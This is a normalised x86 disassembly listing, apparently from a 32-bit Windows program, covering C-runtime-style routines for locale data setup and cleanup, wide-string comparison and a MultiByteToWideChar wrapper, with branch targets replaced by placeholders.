jg r-xdata
mov eax [ ebx + 0x88 ]
xor ecx ecx
mov esi [ ebp - 0x4 ]
inc ecx
mov edi [ ebp - 0xc ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
test edi edi
je r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_439e38
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
pop ebp
retn
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ edx ]
cmp al 0x30
jl r-xdata
pop esi
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
cmp [ edx ] 0x0
jne r-xdata
sub_439e72
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d0aa
pop ecx
push eax
call sub_42d0aa
pop ecx
sub_439edb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
cmp [ ebx + 0xb0 ] eax
jne r-xdata
xor esi esi
inc esi
push 0x50
push esi
mov [ ebp - 0xc ] esi
call sub_42d196
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebx + 0xac ] eax
jne r-xdata
mov esi [ ebx + 0x88 ]
mov edi eax
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
call sub_42d0e4
mov esi eax
xor edi edi
push edi
mov [ ebp - 0x8 ] esi
call sub_42d0aa
pop ecx
pop ecx
test esi esi
jne r-xdata
mov eax esi
jmp r-xdata
mov edi eax
mov [ ebp - 0x8 ] eax
mov esi rw-data
jmp r-xdata
mov [ esi ] edi
cmp [ ebx + 0xb0 ] edi
je r-xdata
push [ ebp - 0x4 ]
call sub_42d0aa
xor eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ rw-data ]
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0x30 ] eax
mov eax [ rw-data ]
mov [ esi + 0x34 ] eax
jmp r-xdata
push 0x4
call sub_42d0e4
mov esi eax
push edi
mov [ ebp - 0x10 ] esi
call sub_42d0aa
pop ecx
pop ecx
test esi esi
je r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov ecx [ ebp - 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
test edi edi
je r-xdata
push [ ebp - 0x4 ]
call sub_42d0aa
mov ecx [ ebp - 0x8 ]
push ecx
call sub_42d0aa
mov eax [ ebp - 0xc ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
mov [ esi ] edi
lea eax [ ebp - 0x18 ]
mov edi [ ebx + 0xb0 ]
push 0xe
push edi
push 0x1
push eax
call sub_444e8e
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x4
lea eax [ ebp - 0x18 ]
push ecx
push 0xf
push edi
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push 0x10
push edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_444e8e
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x30
push eax
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_444e8e
add esp 0x14
or eax esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x80 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov [ edi ] eax
mov edx [ ebp - 0xc ]
mov edx [ edx ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_439e72
or [ ebp - 0xc ] 0xffffffff
pop ecx
push [ ebx + 0x7c ]
call sub_42d0aa
push [ ebx + 0x88 ]
call sub_42d0aa
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0x4 ]
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_43a0f7
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
pop ebp
retn
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ edx ]
cmp al 0x30
jl r-xdata
pop esi
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
cmp [ edx ] 0x0
jne r-xdata
sub_43a143
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x8 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a17c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x1c ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a1b5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x30 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a1ee
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x8 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a227
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x1c ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a260
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + 0x30 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d0aa
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_43a2d3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
push edi
push esi
call sub_43a17c
lea eax [ esi + 0x1c ]
push eax
call sub_43a17c
lea eax [ esi + 0x38 ]
push eax
call sub_43a1b5
lea eax [ esi + 0x68 ]
push eax
call sub_43a1b5
lea edi [ esi + 0x98 ]
add esp 0x10
lea eax [ edi + 0x8 ]
xor ebx ebx
mov ecx eax
sub ecx edi
add ecx 0x3
shr ecx 0x2
cmp eax edi
sbb eax eax
not eax
and eax ecx
mov [ ebp - 0x4 ] eax
je r-xdata
push [ esi + 0xa0 ]
call sub_42d0aa
push [ esi + 0xa4 ]
call sub_42d0aa
push [ esi + 0xa8 ]
call sub_42d0aa
lea eax [ esi + 0xb4 ]
push eax
call sub_43a227
lea eax [ esi + 0xd0 ]
push eax
call sub_43a227
lea eax [ esi + 0xec ]
push eax
call sub_43a260
lea eax [ esi + 0x11c ]
push eax
call sub_43a260
lea edi [ esi + 0x14c ]
add esp 0x1c
lea eax [ edi + 0x8 ]
mov ecx eax
sub ecx edi
add ecx 0x3
shr ecx 0x2
cmp eax edi
sbb eax eax
not eax
and eax ecx
mov [ ebp - 0x4 ] eax
je r-xdata
mov esi ebx
push [ esi + 0x154 ]
call sub_42d0aa
push [ esi + 0x158 ]
call sub_42d0aa
push [ esi + 0x15c ]
call sub_42d0aa
push [ esi + 0x160 ]
call sub_42d0aa
add esp 0x10
pop edi
pop ebx
mov esi eax
push [ edi ]
call sub_42d0aa
inc esi
lea edi [ edi + 0x4 ]
pop ecx
cmp esi [ ebp - 0x4 ]
jne r-xdata
mov esi [ ebp + 0x8 ]
push [ edi ]
call sub_42d0aa
inc ebx
lea edi [ edi + 0x4 ]
pop ecx
cmp ebx esi
jne r-xdata
mov esi [ ebp + 0x8 ]
sub_43a402
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
je r-xdata
mov esi rw-data
xor ebx ebx
push 0x164
inc ebx
push ebx
call sub_42d196
push 0x0
mov esi eax
call sub_42d0aa
add esp 0xc
test esi esi
jne r-xdata
mov [ edi + 0x9c ] esi
xor eax eax
[ eax + 0xb0 ]
push edi
push esi
call sub_43a483
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov [ esi + 0xb0 ] ebx
jmp r-xdata
push esi
call sub_43a2d3
push esi
call sub_42d0aa
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x9c ]
cmp eax rw-data
je r-xdata
sub_43a483
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ebx [ esi + 0xb4 ]
test edi edi
jne r-xdata
push ebx
call sub_42b6fb
and [ ebp - 0x4 ] 0x0
mov [ edi + 0x160 ] eax
lea eax [ edi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
push 0x1
push eax
call sub_444e8e
lea ecx [ edi + 0x8 ]
mov esi eax
push ecx
push 0x32
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x40
or esi eax
lea eax [ edi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
push edi
push 0x37
push ebx
or esi eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x24 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x88 ]
push eax
push 0x40
push ebx
push 0x1
lea eax [ ebp - 0x8 ]
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xa0 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xa4 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xa8 ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0xac ]
push eax
push 0x1009
push ebx
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xb8 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xbc ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xc0 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0xc4 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xc8 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xcc ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xb4 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0xd4 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xd8 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xdc ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xe0 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0xe4 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xe8 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xd0 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xec ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0xf0 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xf4 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xf8 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0xfc ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x100 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x104 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x108 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x10c ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x110 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x114 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x118 ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0x8 ]
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x11c ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x120 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x124 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x128 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x12c ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x130 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x134 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x138 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x13c ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x140 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x144 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x148 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x14c ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or esi eax
lea eax [ edi + 0x150 ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x154 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x158 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
or esi eax
lea eax [ edi + 0x15c ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_444e8e
add esp 0x50
or eax esi
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ac78
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov eax ecx
cmp [ ecx ] dx
je r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
cmp [ eax ] dx
jne r-xdata
movzx edx [ eax ]
mov [ ebp - 0x4 ] edx
mov edx ebx
mov esi edi
test bx bx
je r-xdata
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp [ ebp - 0x4 ] dx
je r-xdata
xor edx edx
sub_43acc8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
sub eax 0x1
je r-xdata
sub_43ad02
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
cmp [ eax ] cx
je r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
movzx edi [ esi ]
add eax 0x2
xor ecx ecx
cmp [ eax ] cx
jne r-xdata
movzx ebx [ eax ]
mov edx edi
mov ecx esi
test di di
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add ecx 0x2
movzx edx [ ecx ]
test dx dx
jne r-xdata
cmp dx bx
je r-xdata
sub_43ad9c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_41cb44
mov ecx [ ebp + 0x1c ]
test ecx ecx
jne r-xdata
xor eax eax
xor edi edi
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
and eax ecx
lea ecx [ ebx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_43aeb9
pop ecx
push ebx
push edi
push esi
call sub_40de60
add esp 0xc
push [ ebp - 0x8 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
call sub_449960
